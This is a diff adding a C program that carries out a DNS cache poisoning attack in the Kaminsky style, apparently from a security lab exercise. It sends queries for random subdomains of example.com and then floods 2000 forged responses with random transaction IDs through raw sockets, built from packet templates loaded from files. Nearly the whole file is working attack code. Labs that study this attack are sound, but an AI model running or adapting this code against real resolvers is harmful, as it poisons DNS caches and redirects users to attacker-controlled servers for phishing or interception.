@@ -1,0 +1,114 @@
+#include <stdlib.h>
+#include <arpa/inet.h>
+#include <string.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <time.h>
+
+#define MAX_FILE_SIZE 1000000
+
+struct ipheader {
+  unsigned char      iph_ihl:4, iph_ver:4;
+  unsigned char      iph_tos;
+  unsigned short int iph_len;
+  unsigned short int iph_ident;
+  unsigned short int iph_flag:3, iph_offset:13;
+  unsigned char      iph_ttl;
+  unsigned char      iph_protocol;
+  unsigned short int iph_chksum;
+  struct in_addr     iph_sourceip;
+  struct in_addr     iph_destip;
+};
+
+void send_raw_packet(char * buffer, int pkt_size);
+
+int main()
+{
+  srand(time(NULL));
+
+  // Load DNS request
+  FILE *f_req = fopen("ip_req.bin", "rb");
+  if (!f_req) { perror("ip_req.bin"); exit(1); }
+  unsigned char ip_req[MAX_FILE_SIZE];
+  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);
+
+  // Load DNS response
+  FILE *f_resp = fopen("ip_resp.bin", "rb");
+  if (!f_resp) { perror("ip_resp.bin"); exit(1); }
+  unsigned char ip_resp[MAX_FILE_SIZE];
+  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);
+
+  char letters[] = "abcdefghijklmnopqrstuvwxyz";
+
+  while (1) {
+
+    // Generate random name
+    char name[6];
+    for (int i = 0; i < 5; i++)
+      name[i] = letters[rand() % 26];
+    name[5] = '\0';
+
+    printf("Query: %s.example.com\n", name);
+
+    // =========================
+    // STEP 1: Send DNS request
+    // =========================
+    memcpy(ip_req + 37, name, 5);
+    send_raw_packet(ip_req, n_req);
+
+    // =========================
+    // STEP 2: Send spoof replies
+    // =========================
+    for (int i = 0; i < 2000; i++) {
+
+      unsigned short id = rand() % 65536;
+      unsigned short id_net = htons(id);
+
+      // Transaction ID
+      memcpy(ip_resp + 28, &id_net, 2);
+
+      memcpy(ip_resp + 37, name, 5);
+      memcpy(ip_resp + 64, name, 5);
+
+      send_raw_packet(ip_resp, n_resp);
+    }
+  }
+}
+
+// send packet
+void send_raw_packet(char * buffer, int pkt_size)
+{
+  struct sockaddr_in dest_info;
+  int enable = 1;
+
+  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
+             &enable, sizeof(enable));
+
+  struct ipheader *ip = (struct ipheader *) buffer;
+
+  dest_info.sin_family = AF_INET;
+
+  dest_info.sin_addr = ip->iph_destip;
+
+  sendto(sock, buffer, pkt_size, 0,
+         (struct sockaddr *)&dest_info, sizeof(dest_info));
+
+  close(sock);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
